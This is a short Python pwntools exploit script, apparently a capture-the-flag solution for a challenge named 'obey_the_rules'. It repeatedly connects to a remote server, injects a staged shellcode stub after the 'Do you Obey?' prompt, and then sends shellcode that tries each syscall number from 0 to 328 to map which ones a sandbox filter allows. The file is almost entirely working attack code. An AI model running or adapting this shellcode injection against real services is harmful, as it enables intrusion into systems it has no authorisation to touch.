from pwn import *
#arg1 = int(sys.argv[1])
#arg2 = ord(sys.argv[2])
#if(len(sys.argv)>3):
#	arg3 = int(sys.argv[3])
#	if(arg3==1):
#		arg2 = ord(sys.argv[2].upper())
#print "index = " + str(arg1)
#print "char = " + str(arg2)
context.arch = 'amd64'
#s=process("./obey_the_rules")

for i in range(329):
    s=remote("138.68.67.161", 20001)
    #gdb.attach(s,'b*0x0000000000400e0f\nc\nset $rax=0\nni')
    shellcode = asm("""
		pop rsi
		xor edi, edi
                xor eax,eax
		syscall
		call rsi
		"""
		)

    s.sendafter("Do you Obey? (yes / no)", "Y" + "\x00" + shellcode)


    if(i < 256):
        shellcode = asm("""
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
                xor eax,eax
                mov al,{}
                syscall
		""".format(i))
    else:
        shellcode = asm("""
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
                xor eax,eax
                mov ax,{}
                syscall
                """.format(i))
    s.sendline(shellcode)

                #mov rax,0x40000006
                #xor rbx,rbx
                #mov bl,0x2
                #int 0x80
    #if(string[0]=="b" or string[0]=="B"):
    #    print "yeeeees"
    #    print i
